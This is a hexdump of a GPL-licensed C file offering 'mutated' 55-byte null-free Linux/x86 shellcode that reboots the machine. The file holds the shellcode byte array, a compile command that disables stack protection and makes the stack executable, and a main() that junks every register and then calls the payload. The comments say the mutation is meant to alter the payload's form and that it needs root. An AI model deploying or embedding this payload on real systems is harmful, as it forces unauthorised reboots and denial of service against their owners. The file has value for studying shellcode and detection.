00000000  2f 2a 0a 0a 20 20 20 4d  75 74 61 74 65 64 20 52  |/*..   Mutated R|
00000010  65 62 6f 6f 74 20 53 68  65 6c 6c 63 6f 64 65 20  |eboot Shellcode |
00000020  2d 20 43 20 4c 61 6e 67  75 61 67 65 20 2d 20 4c  |- C Language - L|
00000030  69 6e 75 78 2f 78 38 36  0a 20 20 20 43 6f 70 79  |inux/x86.   Copy|
00000040  72 69 67 68 74 20 28 43  29 20 32 30 31 33 20 47  |right (C) 2013 G|
00000050  65 79 73 6c 61 6e 20 47  2e 20 42 65 6d 2c 20 48  |eyslan G. Bem, H|
00000060  61 63 6b 69 6e 67 20 62  69 74 73 0a 0a 20 20 20  |acking bits..   |
00000070  68 74 74 70 3a 2f 2f 68  61 63 6b 69 6e 67 62 69  |http://hackingbi|
00000080  74 73 2e 63 6f 6d 0a 20  20 20 67 65 79 73 6c 61  |ts.com.   geysla|
00000090  6e 40 67 6d 61 69 6c 2e  63 6f 6d 0a 0a 20 20 20  |n@gmail.com..   |
000000a0  54 68 69 73 20 70 72 6f  67 72 61 6d 20 69 73 20  |This program is |
000000b0  66 72 65 65 20 73 6f 66  74 77 61 72 65 3a 20 79  |free software: y|
000000c0  6f 75 20 63 61 6e 20 72  65 64 69 73 74 72 69 62  |ou can redistrib|
000000d0  75 74 65 20 69 74 20 61  6e 64 2f 6f 72 20 6d 6f  |ute it and/or mo|
000000e0  64 69 66 79 0a 20 20 20  69 74 20 75 6e 64 65 72  |dify.   it under|
000000f0  20 74 68 65 20 74 65 72  6d 73 20 6f 66 20 74 68  | the terms of th|
00000100  65 20 47 4e 55 20 47 65  6e 65 72 61 6c 20 50 75  |e GNU General Pu|
00000110  62 6c 69 63 20 4c 69 63  65 6e 73 65 20 61 73 20  |blic License as |
00000120  70 75 62 6c 69 73 68 65  64 20 62 79 0a 20 20 20  |published by.   |
00000130  74 68 65 20 46 72 65 65  20 53 6f 66 74 77 61 72  |the Free Softwar|
00000140  65 20 46 6f 75 6e 64 61  74 69 6f 6e 2c 20 65 69  |e Foundation, ei|
00000150  74 68 65 72 20 76 65 72  73 69 6f 6e 20 33 20 6f  |ther version 3 o|
00000160  66 20 74 68 65 20 4c 69  63 65 6e 73 65 2c 20 6f  |f the License, o|
00000170  72 0a 20 20 20 28 61 74  20 79 6f 75 72 20 6f 70  |r.   (at your op|
00000180  74 69 6f 6e 29 20 61 6e  79 20 6c 61 74 65 72 20  |tion) any later |
00000190  76 65 72 73 69 6f 6e 2e  0a 0a 20 20 20 54 68 69  |version...   Thi|
000001a0  73 20 70 72 6f 67 72 61  6d 20 69 73 20 64 69 73  |s program is dis|
000001b0  74 72 69 62 75 74 65 64  20 69 6e 20 74 68 65 20  |tributed in the |
000001c0  68 6f 70 65 20 74 68 61  74 20 69 74 20 77 69 6c  |hope that it wil|
000001d0  6c 20 62 65 20 75 73 65  66 75 6c 2c 0a 20 20 20  |l be useful,.   |
000001e0  62 75 74 20 57 49 54 48  4f 55 54 20 41 4e 59 20  |but WITHOUT ANY |
000001f0  57 41 52 52 41 4e 54 59  3b 20 77 69 74 68 6f 75  |WARRANTY; withou|
00000200  74 20 65 76 65 6e 20 74  68 65 20 69 6d 70 6c 69  |t even the impli|
00000210  65 64 20 77 61 72 72 61  6e 74 79 20 6f 66 0a 20  |ed warranty of. |
00000220  20 20 4d 45 52 43 48 41  4e 54 41 42 49 4c 49 54  |  MERCHANTABILIT|
00000230  59 20 6f 72 20 46 49 54  4e 45 53 53 20 46 4f 52  |Y or FITNESS FOR|
00000240  20 41 20 50 41 52 54 49  43 55 4c 41 52 20 50 55  | A PARTICULAR PU|
00000250  52 50 4f 53 45 2e 20 20  53 65 65 20 74 68 65 0a  |RPOSE.  See the.|
00000260  20 20 20 47 4e 55 20 47  65 6e 65 72 61 6c 20 50  |   GNU General P|
00000270  75 62 6c 69 63 20 4c 69  63 65 6e 73 65 20 66 6f  |ublic License fo|
00000280  72 20 6d 6f 72 65 20 64  65 74 61 69 6c 73 2e 0a  |r more details..|
00000290  0a 20 20 20 59 6f 75 20  73 68 6f 75 6c 64 20 68  |.   You should h|
000002a0  61 76 65 20 72 65 63 65  69 76 65 64 20 61 20 63  |ave received a c|
000002b0  6f 70 79 20 6f 66 20 74  68 65 20 47 4e 55 20 47  |opy of the GNU G|
000002c0  65 6e 65 72 61 6c 20 50  75 62 6c 69 63 20 4c 69  |eneral Public Li|
000002d0  63 65 6e 73 65 0a 20 20  20 61 6c 6f 6e 67 20 77  |cense.   along w|
000002e0  69 74 68 20 74 68 69 73  20 70 72 6f 67 72 61 6d  |ith this program|
000002f0  2e 20 20 49 66 20 6e 6f  74 2c 20 73 65 65 20 26  |.  If not, see &|
00000300  74 3b 68 74 74 70 3a 2f  2f 77 77 77 2e 67 6e 75  |t;http://www.gnu|
00000310  2e 6f 72 67 2f 6c 69 63  65 6e 73 65 73 2f 3e 2e  |.org/licenses/>.|
00000320  0a 0a 2a 2f 0a 0a 2f 2a  0a 0a 20 20 20 6d 75 74  |..*/../*..   mut|
00000330  61 74 65 64 5f 72 65 62  6f 6f 74 5f 73 68 65 6c  |ated_reboot_shel|
00000340  6c 63 6f 64 65 0a 0a 20  20 20 2a 20 35 35 20 62  |lcode..   * 55 b|
00000350  79 74 65 73 0a 20 20 20  2a 20 6e 75 6c 6c 2d 66  |ytes.   * null-f|
00000360  72 65 65 0a 20 20 20 2a  20 6d 75 74 61 74 65 64  |ree.   * mutated|
00000370  20 69 73 6e 27 74 20 70  6f 6c 79 6d 6f 72 70 68  | isn't polymorph|
00000380  69 63 20 28 73 68 65 6c  6c 63 6f 64 65 20 64 6f  |ic (shellcode do|
00000390  65 73 20 6e 6f 74 20 72  65 70 6c 69 63 61 74 65  |es not replicate|
000003a0  20 69 74 73 65 6c 66 20  74 6f 20 62 65 20 63 61  | itself to be ca|
000003b0  6c 6c 65 64 20 70 6f 6c  79 6d 6f 72 70 68 69 63  |lled polymorphic|
000003c0  29 0a 20 20 0a 20 20 0a  20 20 20 23 20 67 63 63  |).  .  .   # gcc|
000003d0  20 2d 6d 33 32 20 2d 66  6e 6f 2d 73 74 61 63 6b  | -m32 -fno-stack|
000003e0  2d 70 72 6f 74 65 63 74  6f 72 20 2d 7a 20 65 78  |-protector -z ex|
000003f0  65 63 73 74 61 63 6b 20  6d 75 74 61 74 65 64 5f  |ecstack mutated_|
00000400  72 65 62 6f 6f 74 5f 73  68 65 6c 6c 63 6f 64 65  |reboot_shellcode|
00000410  2e 63 20 2d 6f 20 6d 75  74 61 74 65 64 5f 72 65  |.c -o mutated_re|
00000420  62 6f 6f 74 5f 73 68 65  6c 6c 63 6f 64 65 0a 0a  |boot_shellcode..|
00000430  20 20 20 54 65 73 74 69  6e 67 0a 20 20 20 2a 20  |   Testing.   * |
00000440  4f 6e 6c 79 20 72 75 6e  20 69 74 20 69 6e 20 61  |Only run it in a|
00000450  20 56 69 72 74 75 61 6c  20 4d 61 63 68 69 6e 65  | Virtual Machine|
00000460  21 21 21 20 59 6f 75 72  20 73 79 73 74 65 6d 20  |!!! Your system |
00000470  77 69 6c 6c 20 63 72 61  73 68 2e 20 55 73 65 20  |will crash. Use |
00000480  61 74 20 79 6f 75 72 20  6f 77 6e 20 72 69 73 6b  |at your own risk|
00000490  21 0a 20 20 20 2a 20 54  6f 20 77 6f 72 6b 20 70  |!.   * To work p|
000004a0  72 6f 70 65 72 6c 79 2c  20 79 6f 75 20 6d 75 73  |roperly, you mus|
000004b0  74 20 62 65 20 73 75 21  0a 0a 2a 2f 0a 0a 0a 23  |t be su!..*/...#|
000004c0  69 6e 63 6c 75 64 65 20  3c 73 74 64 69 6f 2e 68  |include <stdio.h|
000004d0  3e 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 72 69  |>.#include <stri|
000004e0  6e 67 2e 68 3e 0a 0a 75  6e 73 69 67 6e 65 64 20  |ng.h>..unsigned |
000004f0  63 68 61 72 20 73 68 65  6c 6c 63 6f 64 65 5b 5d  |char shellcode[]|
00000500  20 3d 20 5c 0a 0a 20 20  20 20 20 20 20 20 20 20  | = \..          |
00000510  20 20 20 20 22 5c 78 32  39 5c 78 66 66 5c 78 37  |    "\x29\xff\x7|
00000520  34 5c 78 30 31 5c 78 65  38 5c 78 38 33 5c 78 63  |4\x01\xe8\x83\xc|
00000530  37 5c 78 32 34 5c 78 39  37 5c 78 65 62 22 0a 20  |7\x24\x97\xeb". |
00000540  20 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |             "\x|
00000550  30 31 5c 78 65 31 5c 78  63 64 5c 78 38 30 5c 78  |01\xe1\xcd\x80\x|
00000560  65 62 5c 78 30 31 5c 78  66 66 5c 78 36 61 5c 78  |eb\x01\xff\x6a\x|
00000570  32 39 5c 78 35 39 22 0a  20 20 20 20 20 20 20 20  |29\x59".        |
00000580  20 20 20 20 20 20 22 5c  78 65 62 5c 78 30 31 5c  |      "\xeb\x01\|
00000590  78 30 31 5c 78 62 62 5c  78 36 37 5c 78 34 35 5c  |x01\xbb\x67\x45\|
000005a0  78 32 33 5c 78 30 31 5c  78 62 61 5c 78 63 61 22  |x23\x01\xba\xca"|
000005b0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |.              "|
000005c0  5c 78 39 62 5c 78 63 32  5c 78 66 66 5c 78 33 31  |\x9b\xc2\xff\x31|
000005d0  5c 78 64 61 5c 78 37 35  5c 78 30 31 5c 78 65 37  |\xda\x75\x01\xe7|
000005e0  5c 78 38 37 5c 78 64 61  22 0a 20 20 20 20 20 20  |\x87\xda".      |
000005f0  20 20 20 20 20 20 20 20  22 5c 78 38 64 5c 78 34  |        "\x8d\x4|
00000600  31 5c 78 32 66 5c 78 38  64 5c 78 38 39 5c 78 34  |1\x2f\x8d\x89\x4|
00000610  30 5c 78 31 39 5c 78 31  32 5c 78 32 38 5c 78 65  |0\x19\x12\x28\xe|
00000620  62 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |b".             |
00000630  20 22 5c 78 30 32 5c 78  65 38 5c 78 30 31 5c 78  | "\x02\xe8\x01\x|
00000640  63 64 5c 78 38 30 22 3b  0a 0a 0a 6d 61 69 6e 20  |cd\x80";...main |
00000650  28 29 0a 7b 0a 0a 20 20  20 20 2f 2f 20 57 68 65  |().{..    // Whe|
00000660  6e 20 63 6f 6e 74 61 69  6e 73 20 6e 75 6c 6c 20  |n contains null |
00000670  62 79 74 65 73 2c 20 70  72 69 6e 74 66 20 77 69  |bytes, printf wi|
00000680  6c 6c 20 73 68 6f 77 20  61 20 77 72 6f 6e 67 20  |ll show a wrong |
00000690  73 68 65 6c 6c 63 6f 64  65 20 6c 65 6e 67 74 68  |shellcode length|
000006a0  2e 0a 0a 20 20 20 20 70  72 69 6e 74 66 28 22 53  |...    printf("S|
000006b0  68 65 6c 6c 63 6f 64 65  20 4c 65 6e 67 74 68 3a  |hellcode Length:|
000006c0  20 20 25 64 5c 6e 22 2c  20 73 74 72 6c 65 6e 28  |  %d\n", strlen(|
000006d0  73 68 65 6c 6c 63 6f 64  65 29 29 3b 0a 0a 20 20  |shellcode));..  |
000006e0  20 20 2f 2f 20 50 6f 6c  6c 75 74 65 73 20 61 6c  |  // Pollutes al|
000006f0  6c 20 72 65 67 69 73 74  65 72 73 20 65 6e 73 75  |l registers ensu|
00000700  72 69 6e 67 20 74 68 61  74 20 74 68 65 20 73 68  |ring that the sh|
00000710  65 6c 6c 63 6f 64 65 20  72 75 6e 73 20 69 6e 20  |ellcode runs in |
00000720  61 6e 79 20 63 69 72 63  75 6d 73 74 61 6e 63 65  |any circumstance|
00000730  2e 0a 0a 20 20 20 20 5f  5f 61 73 6d 5f 5f 20 28  |...    __asm__ (|
00000740  22 6d 6f 76 6c 20 24 30  78 66 66 66 66 66 66 66  |"movl $0xfffffff|
00000750  66 2c 20 25 65 61 78 5c  6e 5c 74 22 0a 20 20 20  |f, %eax\n\t".   |
00000760  20 20 20 20 20 20 20 20  20 22 6d 6f 76 6c 20 25  |         "movl %|
00000770  65 61 78 2c 20 25 65 62  78 5c 6e 5c 74 22 0a 20  |eax, %ebx\n\t". |
00000780  20 20 20 20 20 20 20 20  20 20 20 22 6d 6f 76 6c  |           "movl|
00000790  20 25 65 61 78 2c 20 25  65 63 78 5c 6e 5c 74 22  | %eax, %ecx\n\t"|
000007a0  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 6d 6f  |.            "mo|
000007b0  76 6c 20 25 65 61 78 2c  20 25 65 64 78 5c 6e 5c  |vl %eax, %edx\n\|
000007c0  74 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |t".            "|
000007d0  6d 6f 76 6c 20 25 65 61  78 2c 20 25 65 73 69 5c  |movl %eax, %esi\|
000007e0  6e 5c 74 22 0a 20 20 20  20 20 20 20 20 20 20 20  |n\t".           |
000007f0  20 22 6d 6f 76 6c 20 25  65 61 78 2c 20 25 65 64  | "movl %eax, %ed|
00000800  69 5c 6e 5c 74 22 0a 20  20 20 20 20 20 20 20 20  |i\n\t".         |
00000810  20 20 20 22 6d 6f 76 6c  20 25 65 61 78 2c 20 25  |   "movl %eax, %|
00000820  65 62 70 5c 6e 5c 74 22  0a 0a 20 20 20 20 20 20  |ebp\n\t"..      |
00000830  20 20 20 20 20 20 2f 2f  20 43 61 6c 6c 69 6e 67  |      // Calling|
00000840  20 74 68 65 20 73 68 65  6c 6c 63 6f 64 65 0a 20  | the shellcode. |
00000850  20 20 20 20 20 20 20 20  20 20 20 22 63 61 6c 6c  |           "call|
00000860  20 73 68 65 6c 6c 63 6f  64 65 22 29 3b 0a 0a 7d  | shellcode");..}|
00000870
